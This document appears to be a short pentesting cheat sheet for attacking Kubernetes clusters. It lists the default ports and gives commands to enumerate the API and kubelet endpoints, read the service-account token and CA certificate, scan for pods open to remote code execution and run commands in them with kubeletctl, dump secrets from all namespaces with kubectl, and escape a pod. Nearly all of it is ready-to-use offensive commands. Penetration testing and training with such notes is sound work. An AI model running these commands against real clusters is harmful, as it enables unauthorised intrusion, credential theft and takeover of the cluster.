### HackTricks
https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services


### Enumerate Kubernetes for API,PODS,NODES etc.
1. Install: https://github.com/aquasecurity/kube-hunter
2. Run a scan:
```
kube-hunter --remote <IP>
```
### Common Ports
```
    443/TCP (Kubernetes API Port)
    6443/TCP (Kubernetes API Port)
    8443/TCP (Minikube API Port)
    8080/TCP (Insecure K8s API Port)
    10250/TCP (kubelet API)
    10251/TCP (kube-scheduler)
    10252/TCP (Controller-manager)Kube API Server
    2379/TCP (etcd Storage)
    2380/TCP (etcd Storage)
    6666/TCP (etcd Storage)etcd Client Server
    4194/TCP (Container Metrics)cAdvisor
    9099/TCP (calico-felix)Health Check Calico Server
    6782–4/TCP (weave)Metrics and Endpoints
    30000–32767/TCPNodePort Service
```
### Enumerate Kube-API
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
### Enumerate Kubelet-API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
### Get service account token
```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```
### Get cluster CA certificate
```
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```


# How to enumerate port 10250 (Kubelet API)
1. List all pods
`kubeletctl pods  --server <ip>`
2. List pod/containers vulnerable to rce(the one with + are vulnerable)
`kubeletctl scan rce  --server <ip>`
3. Run Command on RCE vulnerable pod/container
```
kubeletctl run "<command>" --namespace <namespace> --pod <podname> --container <containername>  --server <ip>
```


# How to enumerate port 8443
(kubectl is the official Kubernetes CLI)
1. Create a temporary Alias(provide token and skil tls verify if you are not using a SSL cert)
```
alias kubectl='kubectl --server=<target>:<port> --token=<service_token> --insecure-skip-tls-verify'
```
2. Get pods
`kubectl get pods`
3. Get namespaces
`kubectl get namespaces`
4. Get all Secrets from a namespaces
`kubectl get secret --namespace <namespace>`
5. Get Secrets from all namespaces
`kubectl get secret --all-namespaces`
6. Get all nodes from a namespace
`kubectl get nodes --namespace <namespace>`
7. Get all pods from a namespace
`kubectl get pods --namespace <namespace>`
8. Output a value from a namespace
`kubectl get secret <itemname> --namespace <namespace> --output json`

# Escape PODS

1.Run the new pod:
`kubectl apply -f escape.yaml`
2.Check that pod is running
`kubectl get pods`
3. Run bash command in new pod
`kubectl exec -it <podname> -- bash`